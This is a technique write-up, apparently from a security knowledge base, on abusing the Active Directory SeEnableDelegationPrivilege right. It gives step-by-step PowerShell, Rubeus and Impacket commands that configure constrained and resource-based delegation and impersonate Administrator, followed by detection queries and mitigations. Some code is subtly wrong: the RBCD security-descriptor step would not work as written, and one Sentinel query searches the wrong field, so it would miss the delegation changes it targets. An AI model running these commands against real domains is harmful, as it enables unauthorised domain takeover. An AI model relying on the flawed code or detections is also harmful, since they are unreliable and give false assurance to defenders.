# [PE-TOKEN-007]: SeEnableDelegationPrivilege Abuse

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PE-TOKEN-007 |
| **MITRE ATT&CK v18.1** | [T1134](https://attack.mitre.org/techniques/T1134/) - Access Token Manipulation (generic; sub-technique not mapped) |
| **Tactic** | Privilege Escalation / Lateral Movement |
| **Platforms** | Windows AD |
| **Severity** | High |
| **CVE** | N/A (permission design flaw / misconfiguration) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Server 2008 R2 and later (Windows 2008+) |
| **Patched In** | N/A (requires privileged access; no patch, only prevention) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** SeEnableDelegationPrivilege (often called "Enable Delegation" or "Enable Computer and User Accounts to be Trusted for Delegation") is a Windows user right that allows an account to modify Kerberos delegation settings on AD objects. Specifically, it permits modification of the `userAccountControl` attribute's delegation flags (TrustedForDelegation, TrustedToAuthForDelegation) and the `msDS-AllowedToDelegateTo` attribute (for Constrained Delegation) or `msDS-AllowedToActOnBehalfOfOtherIdentity` (for Resource-Based Constrained Delegation). If an attacker obtains an account with SeEnableDelegationPrivilege, they can enable delegation on high-value targets (Domain Admins, service accounts) to set up Kerberos delegation attacks, ultimately leading to privilege escalation and domain compromise.

**Attack Surface:** Active Directory user rights assignment; specifically, Group Policy or local policy settings that grant SeEnableDelegationPrivilege. The privilege is typically assigned only to Domain Admins and Enterprise Admins, but misconfigured environments may grant it to additional groups (Service Admins, Exchange Servers, custom delegation admins, etc.).

**Business Impact:** **High – Enables Kerberos Delegation Attacks.** An account with SeEnableDelegationPrivilege can abuse Constrained Delegation (CD) or Resource-Based Constrained Delegation (RBCD) to impersonate any domain user, including Domain Admins, on delegated services. Combined with the ability to create computer accounts (via MachineAccountQuota) or compromise existing service accounts, this leads to privilege escalation and domain takeover.

**Technical Context:** SeEnableDelegationPrivilege abuse typically requires multiple prerequisites: (1) Account possessing the privilege; (2) Target service account (either already exists or attacker can create one); (3) Ability to set delegation properties (via LDAP, PowerShell, or GUI tools). The privilege itself is not commonly audited, making it a stealthy persistence/escalation path if granted to non-obvious accounts.

### Operational Risk

- **Execution Risk:** Low – Straightforward PowerShell/AD modification commands once privilege is confirmed.
- **Stealth:** Medium – Delegation configuration changes are logged (Event 4738 - User account changed) but often not monitored in real-time.
- **Reversibility:** Yes – Delegation properties can be disabled; however, attacker may have already set up other attack vectors.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.2.3.2 (Account Operators) | Restrict users with delegation rights |
| **DISA STIG** | V-42403 (Privileged Groups) | Control access to privilege escalation capabilities |
| **NIST 800-53** | AC-2 | Account Management; AC-6 - Least Privilege |
| **GDPR** | Art. 32 | Technical security controls |
| **DORA** | Art. 9 | Protection and Prevention |
| **NIS2** | Art. 21 | Cybersecurity risk management |
| **ISO 27001** | A.9.2.3 | Privileged access rights; A.9.4.1 - Information access restriction |
| **ISO 27005** | Risk Assessment | Unauthorized elevation via delegation abuse |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** SeEnableDelegationPrivilege (rare; typically Domain Admins/Enterprise Admins only).
- **Required Access:** LDAP/AD write access to modify delegation properties on target account(s).

**Supported Versions:**
- **Windows:** Server 2008 R2 and later (Server 2012, 2012 R2, 2016, 2019, 2022, 2025)
- **Delegation Models Supported:**
  - Unconstrained Delegation (UD) – risky, older model
  - Constrained Delegation (CD) – requires SeEnableDelegationPrivilege on service
  - Resource-Based Constrained Delegation (RBCD) – requires write DACL on target

**Prerequisite Checks:**
- Verify target account can be modified (attacker has write DACL on account object)
- Confirm SeEnableDelegationPrivilege is assigned to attacker's account
- Identify target service(s) for delegation abuse

**Tools & Dependencies:**
- [PowerShell AD Module](https://docs.microsoft.com/en-us/powershell/module/activedirectory/) – Query/modify AD delegation
- [Impacket (Grant Delegation)](https://github.com/fortra/impacket) – Delegation setup from Linux
- [PowerView / PowerSploit](https://github.com/PowerShellMafia/PowerSploit) – Enumerate privileges and delegation
- [Rubeus](https://github.com/GhostPack/Rubeus) – Kerberos delegation abuse (S4U attacks)
- [Bloodhound](https://github.com/BloodHoundAD/BloodHound) – Identify delegation chains and privilege escalation paths

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

#### Check for SeEnableDelegationPrivilege Assignment

```powershell
# Method 1: Query who has the privilege (from domain controller)
gpresult /h report.html  # Generate policy report
# Search report for "SeEnableDelegationPrivilege"

# Method 2: Check Group Policy directly
Get-GPOReport -All -ReportType Html | Select-String -Pattern "SeEnableDelegationPrivilege"

# Method 3: Query local security policy
secedit /export /cfg C:\temp\policy.inf
Select-String -Path C:\temp\policy.inf -Pattern "SeEnableDelegationPrivilege"
```

**What to Look For:**
- Accounts other than Domain Admins/Enterprise Admins with the privilege
- Service accounts with SeEnableDelegationPrivilege (unusual but possible)
- Groups that shouldn't have this privilege (e.g., Help Desk, IT Support)

**Expected Output:**
```
SeEnableDelegationPrivilege = *S-1-5-21-...-512  # Domain Admins
```

#### Identify Accounts with Unconstrained/Constrained Delegation

```powershell
# Find accounts with TrustedForDelegation flag set (Unconstrained)
Get-ADUser -Filter { UserAccountControl -band 0x80000 } -Properties UserAccountControl, TrustedForDelegation

# Find accounts with Constrained Delegation configured
Get-ADUser -Filter * -Properties msDS-AllowedToDelegateTo | Where-Object { $_.'msDS-AllowedToDelegateTo' -ne $null }

Get-ADComputer -Filter * -Properties msDS-AllowedToDelegateTo | Where-Object { $_.'msDS-AllowedToDelegateTo' -ne $null }

# Find accounts with RBCD configured
Get-ADUser -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | Where-Object { $_.'msDS-AllowedToActOnBehalfOfOtherIdentity' -ne $null }
```

**What to Look For:**
- Service accounts with delegation enabled
- Sensitive accounts (Domain Admins, SQL Service) with delegation configured
- Unexpected delegation chains

#### Enumerate LDAP Permissions on Target Accounts

```powershell
# Check who has write permission on a specific user account
$user = Get-ADUser "ServiceAccount"
$acl = Get-Acl -Path "AD:\$($user.DistinguishedName)"
$acl.Access | Where-Object { $_.ActiveDirectoryRights -match "Write" }
```

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Enable Constrained Delegation on Target (PowerShell)

**Supported Versions:** Server 2008 R2 and later

#### Step 1: Verify SeEnableDelegationPrivilege Assignment

**Objective:** Confirm the attacker's account possesses the necessary privilege.

**Command:**
```powershell
# Check if current user has SeEnableDelegationPrivilege
whoami /priv | findstr SeEnableDelegationPrivilege

# Alternative: Check via Group Policy
Get-ADUser $env:USERNAME -Properties MemberOf | Select-Object MemberOf
```

**Expected Output:**
```
SeEnableDelegationPrivilege
```

**What This Means:**
- If output shows the privilege, attacker can modify delegation on AD objects
- If empty, attacker lacks the privilege; step fails

#### Step 2: Identify Target Service

**Objective:** Choose the service to configure delegation for (e.g., a database server, Exchange server, or domain admin user).

**Command:**
```powershell
# List all service accounts
Get-ADUser -Filter { ServicePrincipalName -like "*" } -Properties ServicePrincipalName

# Example targets:
# - Domain Admins (sensitive, high-value)
# - SQL Service accounts
# - Exchange Server
# - File Server
```

**What to Look For:**
- High-privilege accounts (domain-level service accounts)
- Accounts with SPNs (Service Principal Names)

#### Step 3: Set Delegation Target (msDS-AllowedToDelegateTo)

**Objective:** Configure Constrained Delegation on the target account to allow impersonation to specified services.

**Command (Enable CD on Service Account to Impersonate to FILE Server):**
```powershell
# Method 1: Using Set-ADUser (if SeEnableDelegationPrivilege is held)
$serviceAccount = Get-ADUser "ServiceAccount"
Set-ADUser -Identity $serviceAccount -ServicePrincipalNames @{Add="cifs/fileserver.domain.local"}

# Then set delegation target
Set-ADUser -Identity $serviceAccount -Add @{"msDS-AllowedToDelegateTo" = @("cifs/fileserver.domain.local")}

# Verify
Get-ADUser -Identity $serviceAccount -Properties msDS-AllowedToDelegateTo | Select-Object msDS-AllowedToDelegateTo
```

**Expected Output:**
```
msDS-AllowedToDelegateTo : {cifs/fileserver.domain.local}
```

**What This Means:**
- The service account is now configured for Constrained Delegation
- The account can now impersonate ANY user to the FILE server CIFS service
- Next step: Obtain credentials for this service account and perform S4U2Self/S4U2Proxy attacks

#### Step 4: Obtain Service Account Credentials

**Objective:** Get the password or NTLM hash for the service account (now configured for delegation).

**Command (Kerberoast the Service Account):**
```powershell
# If the account has an SPN, Kerberoast it
Get-ADUser -Identity $serviceAccount -Properties ServicePrincipalName | Select-Object ServicePrincipalName

# Request TGS and crack offline
# (Use Impacket GetUserSPNs or Rubeus for this)
```

**Alternative: Compromise the Account Directly**
```powershell
# If attacker has local admin on server running the service, dump credentials:
# Use Mimikatz, dumping LSASS, or other credential extraction
```

#### Step 5: Perform S4U2Proxy Attack

**Objective:** Use the compromised service account to impersonate Domain Admin and access the delegated service.

**Command (Using Rubeus on Windows):**
```powershell
# Step 1: Get TGT for compromised service account
.\Rubeus.exe asktgt /user:serviceaccount /password:ServicePassword123! /domain:domain.local /dc:dc01

# Step 2: Use S4U2Proxy to impersonate admin
.\Rubeus.exe s4u /ticket:serviceaccount.kirbi /impersonateuser:Administrator /mspn:cifs/fileserver.domain.local /ptt
```

**Command (Using Impacket on Linux):**
```bash
# getTGT for service account
python3 getTGT.py 'domain.local/serviceaccount:ServicePassword123!'

# getST with S4U2Proxy
export KRB5CCNAME=serviceaccount.ccache
python3 getST.py -self -impersonate Administrator -altservice cifs/fileserver.domain.local -k -no-pass -dc-ip 10.0.0.1 domain.local/serviceaccount
```

---

### METHOD 2: Resource-Based Constrained Delegation (RBCD) Setup

**Supported Versions:** Server 2012 and later

#### Step 1: Identify Target with Write DACL

**Objective:** Find a target account (file server, database server, etc.) that the attacker can write to.

**Command:**
```powershell
# Method 1: Manual enumeration
Get-ADComputer -Filter * | ForEach-Object {
    $acl = Get-Acl -Path "AD:\$($_.DistinguishedName)"
    if ($acl.Access | Where-Object { $_.IdentityReference -match $env:USERNAME -and $_.ActiveDirectoryRights -match "Write" }) {
        Write-Host "Writable: $($_.Name)"
    }
}

# Method 2: Use BloodHound to visualize write permissions
# (Graph: "Find object owned by current user" -> privileges chain)
```

#### Step 2: Create Computer Account or Use Existing

**Objective:** Create a new computer account (or use an existing one if compromised) that will impersonate admin to the target.

**Command:**
```powershell
# Create new computer account
New-ADComputer -Name "ATTACKPC" -SamAccountName "ATTACKPC$" -Description "Dummy account for testing"

# Set password
Set-ADAccountPassword -Identity "ATTACKPC$" -NewPassword (ConvertTo-SecureString "AttackPassword123!" -AsPlainText -Force) -Reset
```

#### Step 3: Configure RBCD on Target (msDS-AllowedToActOnBehalfOfOtherIdentity)

**Objective:** Allow the attacker's computer account to impersonate users to the target.

**Command:**
```powershell
# Get the ATTACKPC$ computer's SID
$attackerSID = (Get-ADComputer "ATTACKPC$").SID

# Get target computer
$target = Get-ADComputer "TargetFileServer"

# Create security descriptor allowing impersonation
$sd = New-Object System.DirectoryServices.ActiveDirectorySecurity
$sd.SetSecurityDescriptorBinaryForm($attackerSID.Value)

# Set on target's msDS-AllowedToActOnBehalfOfOtherIdentity
Set-ADComputer -Identity $target -Replace @{"msDS-AllowedToActOnBehalfOfOtherIdentity" = $sd}

# Verify
Get-ADComputer -Identity $target -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
```

#### Step 4: Perform RBCD Impersonation

**Command (Using Rubeus):**
```powershell
# Get TGT for ATTACKPC$
.\Rubeus.exe asktgt /user:ATTACKPC$ /password:AttackPassword123! /domain:domain.local /dc:dc01

# Use S4U2Proxy to impersonate admin on target
.\Rubeus.exe s4u /ticket:attackpc.kirbi /impersonateuser:Administrator /mspn:cifs/targetfileserver.domain.local /ptt
```

**Command (Using Impacket):**
```bash
# Similar to Constrained Delegation method above
python3 getTGT.py 'domain.local/ATTACKPC$:AttackPassword123!'
export KRB5CCNAME=attackpc.ccache
python3 getST.py -self -impersonate Administrator -altservice cifs/targetfileserver.domain.local -k -no-pass domain.local/ATTACKPC$
```

---

## 5. TOOLS & COMMANDS REFERENCE

### PowerShell Active Directory Module

**URL:** [Microsoft Docs - AD Module](https://docs.microsoft.com/en-us/powershell/module/activedirectory/)

**Usage:**
```powershell
Get-ADUser -Identity "username" -Properties msDS-AllowedToDelegateTo
Set-ADUser -Identity "username" -Add @{"msDS-AllowedToDelegateTo" = @("service/target.domain.local")}
```

### PowerView (PowerSploit)

**URL:** [GitHub - PowerSploit](https://github.com/PowerShellMafia/PowerSploit)

**Usage:**
```powershell
Get-DomainUser -Unconstrained  # Find unconstrained delegation
Find-DomainUserLocation  # Find users with interesting permissions
```

### Rubeus (Kerberos Delegation Abuse)

**URL:** [GitHub - Rubeus](https://github.com/GhostPack/Rubeus)

**Usage:**
```powershell
.\Rubeus.exe asktgt /user:svc_account /password:Password123! /domain:domain.local
.\Rubeus.exe s4u /ticket:svc_account.kirbi /impersonateuser:Administrator /mspn:cifs/target.domain.local
```

### BloodHound

**URL:** [GitHub - BloodHound](https://github.com/BloodHoundAD/BloodHound)

**Usage:** GUI-based; search for delegation chains and privilege escalation paths

---

## 6. MICROSOFT SENTINEL DETECTION

#### Query 1: SeEnableDelegationPrivilege Assignment

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4704  // User Right Assigned
| where PrivilegeList contains "SeEnableDelegationPrivilege"
| project TimeGenerated, Computer, SubjectUserName=tolower(SubjectUserName), PrivilegeList
| where SubjectUserName !in ("system", "local service", "network service")  // Filter known accounts
```

#### Query 2: Delegation Configuration Changes

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4738  // User account changed
| where TargetUserName has "msDS-AllowedToDelegateTo" or TargetUserName has "msDS-AllowedToActOnBehalfOfOtherIdentity"
| project TimeGenerated, Computer, SubjectUserName, TargetUserName, TargetSid
```

---

## 7. WINDOWS EVENT LOG MONITORING

**Event ID: 4704 (User Right Assigned)**
- **Log Source:** Security
- **Trigger:** When SeEnableDelegationPrivilege (or other rights) assigned
- **Filter:** Privilege = "SeEnableDelegationPrivilege"

**Event ID: 4738 (User Account Modified)**
- **Log Source:** Security
- **Trigger:** Delegation properties changed (msDS-AllowedToDelegateTo, msDS-AllowedToActOnBehalfOfOtherIdentity)
- **Filter:** Account modified by non-admin; sensitive targets modified

---

## 8. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

*   **Restrict SeEnableDelegationPrivilege Assignment:** Ensure only Domain Admins and Enterprise Admins hold this privilege.
    
    **Manual Steps (Group Policy):**
    1. Open **Group Policy Management Console** (gpmc.msc)
    2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Local Policies** → **User Rights Assignment**
    3. Locate: **Enable computer and user accounts to be trusted for delegation**
    4. Ensure only **Domain Admins** and **Enterprise Admins** are listed
    5. Remove any custom groups
    6. Run `gpupdate /force`

*   **Restrict Constrained Delegation Usage:** Audit all accounts with delegation enabled; remove unless business-critical.
    
    **Manual Steps (PowerShell):**
    ```powershell
    # Find all accounts with delegation
    Get-ADUser -Filter * -Properties msDS-AllowedToDelegateTo | Where-Object { $_.'msDS-AllowedToDelegateTo' -ne $null } | Format-Table Name, msDS-AllowedToDelegateTo
    
    # Remove delegation if not needed
    Set-ADUser -Identity "ServiceAccount" -Clear msDS-AllowedToDelegateTo
    ```

*   **Enable Audit Logging for Delegation Changes:**
    
    **Manual Steps (Auditing):**
    1. Open **Group Policy Management Console** (gpmc.msc)
    2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Account Management**
    3. Enable: **Audit User Account Management**
    4. Set to: **Success and Failure**
    5. Run `gpupdate /force`

#### Priority 2: HIGH

*   **Monitor for Unusual Delegation Configurations:** Alert on unexpected delegation assignments.

*   **Restrict DACL Write Permissions:** Limit who can modify computer/user object properties.
    
    **Manual Steps:**
    1. Open **Active Directory Users and Computers**
    2. Navigate to target object → **Properties** → **Security** tab → **Advanced**
    3. Review permissions; remove unnecessary "Write" ACLs
    4. Restrict to Domain Admins only

*   **Use RBCD Over Unconstrained/Constrained Delegation:** RBCD is more secure (controlled at target level).

#### Validation Command

```powershell
# Verify SeEnableDelegationPrivilege assignment
Get-GPOReport -All -ReportType Html | Select-String -Pattern "SeEnableDelegationPrivilege"

# Find all accounts with delegation
Get-ADUser -Filter { userAccountControl -band 0x80000 } | Select-Object Name, UserAccountControl

# Verify audit policies
auditpol /get /subcategory:"User Account Management" /r
```

---

## 9. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise

*   **Registry/AD Changes:**
    - msDS-AllowedToDelegateTo modified on service account
    - msDS-AllowedToActOnBehalfOfOtherIdentity modified on target
    - userAccountControl delegation flags changed

*   **Event Log Indicators:**
    - Event 4704 (User Right Assigned - SeEnableDelegationPrivilege)
    - Event 4738 (User account modified with delegation changes)
    - Event 4768/4769 (Unusual Kerberos S4U requests)

#### Response Procedures

1.  **Isolate Compromised Accounts:**
    ```powershell
    Disable-ADAccount -Identity "CompromisedService"
    ```

2.  **Remove Delegation Configuration:**
    ```powershell
    Set-ADUser -Identity "CompromisedService" -Clear msDS-AllowedToDelegateTo
    ```

3.  **Audit Kerberos Tickets:**
    ```powershell
    Get-WinEvent -LogName Security -FilterXPath "*[System[(EventID=4768 or EventID=4769)]]" | Select-Object TimeCreated, Message
    ```

---
